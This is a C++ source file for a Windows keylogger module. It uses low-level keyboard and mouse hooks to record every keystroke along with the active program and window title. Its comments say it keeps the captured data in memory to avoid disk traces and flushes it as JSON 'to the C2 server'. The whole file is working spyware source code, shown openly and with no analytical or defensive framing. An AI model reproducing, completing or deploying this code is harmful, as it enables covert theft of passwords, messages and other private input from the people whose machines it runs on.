#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <iostream>
#include <fstream>
#include <shlobj.h>
#include <string>
#include <vector>
#include <cstdio>
#include <uiautomation.h>

// ---------------------------------------------------------------------------
// In-memory keylog buffer — entries are accumulated here and flushed to the
// C2 server on demand via FlushKeylogs().  Nothing is written to disk.
// ---------------------------------------------------------------------------
struct KeylogEntry {
    std::string key;         // human-readable key string e.g. "h", "[Enter]"
    std::string application; // executable name of active window
    std::string windowTitle; // window title at time of keypress
    DWORD       timestamp;   // GetTickCount() at time of keypress
};

static std::vector<KeylogEntry> g_keyBuffer;
static CRITICAL_SECTION         g_keyBufferLock;
static bool                     g_lockInit = false;

HHOOK g_hKeyboardHook = NULL;
HHOOK g_hMouseHook = NULL;
std::ofstream g_logFile;
HANDLE g_hLogFile = INVALID_HANDLE_VALUE;

BOOL InitMacroStorage() {
    // Legacy function kept for compatibility — nothing to do with in-memory buffer
    return TRUE;
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

// Map a virtual-key code to a human-readable string like "a", "[Enter]", etc.
static std::string VkToString(DWORD vk, DWORD scanCode) {
    // Special keys
    switch (vk) {
        case VK_RETURN:  return "\n[Enter]\n";
        case VK_BACK:    return "[Backspace]";
        case VK_TAB:     return "\n[Tab]\n";
        case VK_ESCAPE:  return "[Esc]";
        case VK_SPACE:   return " ";
        case VK_DELETE:  return "[Del]";
        case VK_LEFT:    return "[Left]";
        case VK_RIGHT:   return "[Right]";
        case VK_UP:      return "[Up]";
        case VK_DOWN:    return "[Down]";
        case VK_HOME:    return "[Home]";
        case VK_END:     return "[End]";
        case VK_PRIOR:   return "[PgUp]";
        case VK_NEXT:    return "[PgDn]";
        case VK_LWIN:    return "[LWin]";
        case VK_RWIN:    return "[RWin]";
        case VK_APPS:    return "[Menu]";
        case VK_SNAPSHOT: return "[PrtScn]";
        case VK_INSERT:  return "[Ins]";
        case VK_SHIFT:   case VK_LSHIFT: case VK_RSHIFT:   return "";
        case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: return "";
        case VK_MENU:    case VK_LMENU: case VK_RMENU:     return "";
        case VK_CAPITAL: return "[CapsLock]";
        case VK_F1:  return "[F1]";  case VK_F2:  return "[F2]";
        case VK_F3:  return "[F3]";  case VK_F4:  return "[F4]";
        case VK_F5:  return "[F5]";  case VK_F6:  return "[F6]";
        case VK_F7:  return "[F7]";  case VK_F8:  return "[F8]";
        case VK_F9:  return "[F9]";  case VK_F10: return "[F10]";
        case VK_F11: return "[F11]"; case VK_F12: return "[F12]";
    }

    // Try to get the printable character using the current keyboard layout
    BYTE keyState[256] = {0};
    GetKeyboardState(keyState);
    
    // In a low-level hook, GetKeyboardState often misses the shift/caps state of the target thread. 
    // Manually push the actual real-time state for shift, control, alt, caps.
    keyState[VK_SHIFT]   = (GetAsyncKeyState(VK_SHIFT) & 0x8000) ? 0x80 : 0;
    keyState[VK_LSHIFT]  = (GetAsyncKeyState(VK_LSHIFT) & 0x8000) ? 0x80 : 0;
    keyState[VK_RSHIFT]  = (GetAsyncKeyState(VK_RSHIFT) & 0x8000) ? 0x80 : 0;
    keyState[VK_CAPITAL] = (GetKeyState(VK_CAPITAL) & 0x0001) ? 1 : 0; // GetKeyState works here for toggles
    keyState[VK_CONTROL] = (GetAsyncKeyState(VK_CONTROL) & 0x8000) ? 0x80 : 0;
    keyState[VK_MENU]    = (GetAsyncKeyState(VK_MENU) & 0x8000) ? 0x80 : 0;

    HWND hFg = GetForegroundWindow();
    DWORD threadId = GetWindowThreadProcessId(hFg, NULL);
    HKL layout = GetKeyboardLayout(threadId);

    WCHAR buf[4] = {0};
    int res = ToUnicodeEx(vk, scanCode, keyState, buf, 3, 0, layout);
    if (res == 1) {
        // Convert wide char to UTF-8
        char utf8[8] = {0};
        WideCharToMultiByte(CP_UTF8, 0, buf, 1, utf8, sizeof(utf8), NULL, NULL);
        return std::string(utf8);
    }
    // Fallback: hex VK
    char hex[12];
    _snprintf(hex, sizeof(hex), "[VK%02X]", (unsigned)vk);
    return std::string(hex);
}

// Get the executable name (no path) and window title of the foreground window
static void GetActiveWindowInfo(std::string& appName, std::string& title) {
    appName = "";
    title   = "";
    HWND hFg = GetForegroundWindow();
    if (!hFg) return;

    // Window title
    char titleBuf[256] = {0};
    GetWindowTextA(hFg, titleBuf, sizeof(titleBuf));
    title = titleBuf;

    // Process executable name
    DWORD pid = 0;
    GetWindowThreadProcessId(hFg, &pid);
    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (hProc) {
        char exePath[MAX_PATH] = {0};
        DWORD len = MAX_PATH;
        if (QueryFullProcessImageNameA(hProc, 0, exePath, &len)) {
            // Strip path — keep only "chrome.exe" etc.
            const char* slash = strrchr(exePath, '\\');
            appName = slash ? (slash + 1) : exePath;
        }
        CloseHandle(hProc);
    }
}

// ---------------------------------------------------------------------------
// Low-level keyboard hook
// ---------------------------------------------------------------------------
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && g_hKeyboardHook) {
        // Only capture key-down events (avoid duplicate entries for up events)
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT* pKeyInfo = (KBDLLHOOKSTRUCT*)lParam;
            std::string keyStr = VkToString(pKeyInfo->vkCode, pKeyInfo->scanCode);
            if (!keyStr.empty()) {
                std::string app, winTitle;
                GetActiveWindowInfo(app, winTitle);

                KeylogEntry entry;
                entry.key         = keyStr;
                entry.application = app;
                entry.windowTitle = winTitle;
                entry.timestamp   = GetTickCount();

                if (g_lockInit) {
                    EnterCriticalSection(&g_keyBufferLock);
                    g_keyBuffer.push_back(entry);
                    // Cap buffer at 10000 entries to avoid unbounded memory growth
                    if (g_keyBuffer.size() > 10000)
                        g_keyBuffer.erase(g_keyBuffer.begin());
                    LeaveCriticalSection(&g_keyBufferLock);
                }

                // Also write to file log if one is open (legacy support)
                if (g_hLogFile != INVALID_HANDLE_VALUE) {
                    char line[512];
                    int len = _snprintf(line, sizeof(line), "[%s] %s -> %s\r\n",
                        app.c_str(), winTitle.c_str(), keyStr.c_str());
                    if (len > 0) {
                        DWORD written = 0;
                        WriteFile(g_hLogFile, line, (DWORD)len, &written, NULL);
                    }
                }
            }
        }
    }
    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}

// ---------------------------------------------------------------------------
// Low-level mouse hook (just for separating fields)
// ---------------------------------------------------------------------------
LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && g_hMouseHook) {
        if (wParam == WM_LBUTTONDOWN) {
            std::string app, winTitle;
            GetActiveWindowInfo(app, winTitle);

            KeylogEntry entry;
            entry.key         = "\n[Click]\n";
            entry.application = app;
            entry.windowTitle = winTitle;
            entry.timestamp   = GetTickCount();

            if (g_lockInit) {
                EnterCriticalSection(&g_keyBufferLock);
                g_keyBuffer.push_back(entry);
                if (g_keyBuffer.size() > 10000)
                    g_keyBuffer.erase(g_keyBuffer.begin());
                LeaveCriticalSection(&g_keyBufferLock);
            }
        }
    }
    return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}

// ---------------------------------------------------------------------------
// FlushKeylogs — drain the in-memory buffer and return JSON for C2 transport
//
// Returns a JSON array string: [{"key":"h","app":"chrome.exe","win":"Gmail","ts":1234}, ...]
// Clears the buffer after copying.
// Returns empty string if nothing captured.
// ---------------------------------------------------------------------------
std::string FlushKeylogs() {
    if (!g_lockInit) return "";

    std::vector<KeylogEntry> snapshot;
    EnterCriticalSection(&g_keyBufferLock);
    snapshot.swap(g_keyBuffer);
    LeaveCriticalSection(&g_keyBufferLock);

    if (snapshot.empty()) return "";

    // Build JSON manually (no external lib dependency)
    // Escape special JSON chars in a string
    auto jsonEscape = [](const std::string& s) -> std::string {
        std::string out;
        out.reserve(s.size() + 4);
        for (unsigned char c : s) {
            switch (c) {
                case '"':  out += "\\\""; break;
                case '\\': out += "\\\\"; break;
                case '\n': out += "\\n";  break;
                case '\r': out += "\\r";  break;
                case '\t': out += "\\t";  break;
                default:
                    if (c < 0x20) {
                        char hex[8];
                        _snprintf(hex, sizeof(hex), "\\u%04x", c);
                        out += hex;
                    } else {
                        out += (char)c;
                    }
            }
        }
        return out;
    };

    std::string json = "[";
    for (size_t i = 0; i < snapshot.size(); i++) {
        const KeylogEntry& e = snapshot[i];
        if (i > 0) json += ",";
        char buf[1024];
        _snprintf(buf, sizeof(buf),
            "{\"key\":\"%s\",\"app\":\"%s\",\"win\":\"%s\",\"ts\":%lu}",
            jsonEscape(e.key).c_str(),
            jsonEscape(e.application).c_str(),
            jsonEscape(e.windowTitle).c_str(),
            (unsigned long)e.timestamp);
        json += buf;
    }
    json += "]";
    return json;
}

static DWORD g_keyloggerThreadId = 0;
static HANDLE g_keyloggerThread = NULL;

DWORD WINAPI KeyloggerThreadProc(LPVOID lpParam) {
    g_hKeyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        LowLevelKeyboardProc,
        GetModuleHandle(NULL),
        0
    );

    g_hMouseHook = SetWindowsHookEx(
        WH_MOUSE_LL,
        LowLevelMouseProc,
        GetModuleHandle(NULL),
        0
    );

    if (g_hKeyboardHook == NULL) {
        std::cerr << "SetWindowsHookEx failed: " << GetLastError() << std::endl;
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    if (g_hKeyboardHook != NULL) {
        UnhookWindowsHookEx(g_hKeyboardHook);
        g_hKeyboardHook = NULL;
    }
    if (g_hMouseHook != NULL) {
        UnhookWindowsHookEx(g_hMouseHook);
        g_hMouseHook = NULL;
    }

    return 0;
}

BOOL StartKeyboardHook(const char* logPath) {
    if (!g_lockInit) {
        InitializeCriticalSection(&g_keyBufferLock);
        g_lockInit = true;
    }
    g_keyBuffer.clear();

    // Optional: open file log if path provided (legacy support)
    if (logPath && logPath[0] != '\0') {
        g_logFile.open(logPath, std::ios::app);
    }

    if (g_keyloggerThread == NULL) {
        g_keyloggerThread = CreateThread(NULL, 0, KeyloggerThreadProc, NULL, 0, &g_keyloggerThreadId);
        if (g_keyloggerThread == NULL) {
            std::cerr << "Failed to create keylogger thread" << std::endl;
            if (g_logFile.is_open()) g_logFile.close();
            return FALSE;
        }
    }

    std::cout << "[+] Keylogger started" << std::endl;
    return TRUE;
}

void StopKeyboardHook() {
    if (g_keyloggerThreadId != 0) {
        PostThreadMessage(g_keyloggerThreadId, WM_QUIT, 0, 0);
        WaitForSingleObject(g_keyloggerThread, INFINITE);
        CloseHandle(g_keyloggerThread);
        g_keyloggerThread = NULL;
        g_keyloggerThreadId = 0;
    }

    if (g_logFile.is_open()) g_logFile.close();

    if (g_hLogFile != INVALID_HANDLE_VALUE) {
        CloseHandle(g_hLogFile);
        g_hLogFile = INVALID_HANDLE_VALUE;
    }

    if (g_lockInit) {
        EnterCriticalSection(&g_keyBufferLock);
        g_keyBuffer.clear();
        LeaveCriticalSection(&g_keyBufferLock);
    }

    std::cout << "[-] Keylogger stopped" << std::endl;
}